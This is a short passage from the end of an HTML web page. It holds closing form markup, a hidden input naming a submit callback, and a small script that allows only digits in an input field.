              </div>
            </div>
            <input type='hidden' class='ap-jsFunctionTxt' value='function(){onForm2Submit_PostGenModalCheck();}'>
          </button>
        </div>
      </form>
    </div>
  </div>
  <form novalidate=""></form>
  <script type="text/javascript">
    function isInputNumber(evt) {
      var ch = String.fromCharCode(evt.which);
      if (!(/[0-9]/.test(ch))) {
        evt.preventDefault();
      }
    }
  </script>
</body>

</html>